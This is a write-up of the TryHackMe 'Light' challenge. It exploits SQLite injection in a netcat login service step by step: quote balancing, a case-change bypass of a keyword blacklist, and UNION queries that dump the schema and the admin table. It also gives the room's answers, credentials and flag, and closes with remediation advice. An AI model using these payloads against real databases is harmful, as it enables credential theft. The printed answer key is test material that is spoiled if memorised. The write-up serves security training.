# TryHackMe — Light

**Platform**: TryHackMe  
**Challenge Name**: Light  
**Target IP**: `10.48.139.186`  
**Port**: `1337` (TCP)  
**Category**: Web / Network Exploitation — SQLite Injection  
**Difficulty**: Easy / Medium  
**Flag**: `THM{SQLit3_InJ3cTion_is_SimplE_nO?}`  

---

## 1. Challenge Overview

The challenge presents a custom database service called **Light**, running on port 1337. The hint in the prompt mentions connecting via `nc 10.48.139.186 1337` and provides the test username `smokey`.

Our goals are:
1. Discover the admin username.
2. Retrieve the password for the admin account.
3. Capture the flag.

---

## 2. Initial Reconnaissance & Interaction

Connecting to the service using Netcat:

```bash
nc 10.48.139.186 1337
```

**Banner Output:**
```text
Welcome to the Light database!
Please enter your username: 
```

Testing the provided username `smokey`:
```text
Please enter your username: smokey
Password: vYQ5ngPpw8AdUmL
Please enter your username: 
```

The application accepts a username, performs a lookup against its database, and echoes back the associated password.

---

## 3. Vulnerability Analysis: SQL Injection

### A. Probing with Single Quotes

Inputting a single quote (`'`) to test for string delimiters:
```text
Please enter your username: '
Error: unrecognized token: "''' LIMIT 30"
```

The error message reveals critical backend implementation details:
1. The backend database engine is **SQLite** (standard syntax error format and `LIMIT` clause).
2. The query is constructed via dynamic string formatting:
   ```sql
   SELECT password FROM ... WHERE username = '<USER_INPUT>' LIMIT 30
   ```
3. The query appends `' LIMIT 30` after our input.

### B. Filter / Blacklist Discovery

Testing standard SQL comments and boolean conditions:
```text
Please enter your username: ' OR 1=1 --
For strange reasons I can't explain, any input containing /*, -- or, %0b is not allowed :)
```

The application enforces a blacklist blocking:
- Comment sequences: `--` and `/*`
- Special whitespace: `%0b`

However, since the query ends with `' LIMIT 30`, we don't need comment characters. We can simply balance the trailing quote using standard boolean logic:
```sql
' OR '1'='1
```

Testing quote balancing:
```text
Please enter your username: ' OR '1'='1
Password: tF8tj2o94WE4LKC
```

The boolean `OR '1'='1'` evaluates to true for all records, and SQLite returns the password of the first record in the table: `tF8tj2o94WE4LKC`.

---

## 4. Bypassing Keyword Blacklists

Next, we tested UNION-based exploitation. Entering `UNION SELECT`:
```text
Please enter your username: ' UNION SELECT '1' WHERE '1'='1
Ahh there is a word in there I don't like :(
```

By systematically testing individual SQL keywords against the filter, we determined:
- `union` / `UNION` was blocked.
- `select` / `SELECT` was blocked.
- Other keywords like `WHERE`, `FROM`, `AND`, `OR`, `LIKE`, `GLOB`, `ORDER`, `LIMIT` were permitted.

Crucially, testing case variations revealed that the filter only inspected exact lowercase/uppercase patterns:
- Using mixed/title case like `Union Select` completely bypassed the blacklist filter!

Testing `Union Select`:
```text
Please enter your username: ' Union Select '1' WHERE '1'='1
Password: 1
```

The `UNION SELECT` succeeded immediately, proving that the original query projects **exactly 1 column** (`Password`).

---

## 5. Database Schema & Data Exfiltration

With unrestricted `Union Select` execution, we queried SQLite's internal catalog `sqlite_master` to dump all tables and their definitions.

### A. Extracting Table Schemas

```sql
' Union Select sql From sqlite_master Where '1'='1
```

**Output:**
```sql
CREATE TABLE admintable (
    id INTEGER PRIMARY KEY,
    username TEXT,
    password INTEGER
)
```

Enumerating all table names in the database:
```sql
' Union Select group_concat(name, 0x2c) From sqlite_master Where '1'='1
```

**Result:**
```text
usertable, admintable
```

The database houses two separate tables:
1. `usertable`: Contains standard users (`alice`, `rob`, `john`, `michael`, `smokey`, `hazel`, `ralph`, `steve`).
2. `admintable`: Contains administrative credentials and challenge secrets!

---

### B. Dumping the `admintable`

Instead of running any complex scripts, we can retrieve everything directly through our netcat session. 

#### Option 1: Retrieve All Admin Records in a Single Query
By utilizing SQLite's built-in `group_concat()`, we can concatenate all usernames and passwords across the entire `admintable` into one line:

```text
Please enter your username: ' Union Select group_concat(username || ' : ' || password) From admintable Where '1'='1
```

**Output:**
```text
Password: TryHackMeAdmin : mamZtAuMlrsEy5bp6q17,flag : THM{SQLit3_InJ3cTion_is_SimplE_nO?}
```

#### Option 2: Querying Individual Rows

To view the admin credentials (`id = 1`):
```text
Please enter your username: ' Union Select username || ' | ' || password From admintable Where id = 1 And '1'='1
Password: TryHackMeAdmin | mamZtAuMlrsEy5bp6q17
```

To view the flag (`id = 2`):
```text
Please enter your username: ' Union Select username || ' | ' || password From admintable Where id = 2 And '1'='1
Password: flag | THM{SQLit3_InJ3cTion_is_SimplE_nO?}
```

#### Behind the Scenes: What SQLite Actually Executes
When we submit the flag payload, the server wraps it inside its query template, resulting in the following query executed on the database:

```sql
SELECT password FROM usertable WHERE username = '' Union Select username || ' | ' || password From admintable Where id = 2 And '1'='1' LIMIT 30
```
- `username = ''` returns no rows from `usertable`.
- `Union Select ... From admintable Where id = 2` extracts row 2 from `admintable`.
- `And '1'='1'` seamlessly consumes the trailing `' LIMIT 30` without syntax errors.

---

## 6. Challenge Questions & Answers

| # | Question | Answer |
|---|---|---|
| 1 | What is the admin username? | `TryHackMeAdmin` |
| 2 | What is the password to the username mentioned in question 1? | `mamZtAuMlrsEy5bp6q17` |
| 3 | What is the flag? | `THM{SQLit3_InJ3cTion_is_SimplE_nO?}` |

---

## 7. Key Takeaways & Remediation

1. **Flawed Blacklist Sanitization**:
   - The application attempted to secure raw SQL queries by blacklisting comments (`--`, `/*`) and specific strings (`union`, `select`). Because SQL engines like SQLite are case-insensitive (`Union Select` is treated identically to `UNION SELECT`), simple casing changes render string matching useless.
2. **Quote Balancing vs Comment Stripping**:
   - Stripping comment characters does not prevent SQL injection when the attacker can balance single quotes and construct syntactically valid queries with `AND '1'='1`.
3. **Defense-in-Depth via Parameterized Queries**:
   - The root cause is unsanitized string formatting in database queries. Utilizing parameterized queries (e.g., `cursor.execute("SELECT password FROM usertable WHERE username = ?", (username,))`) completely neutralizes SQL injection regardless of user input.
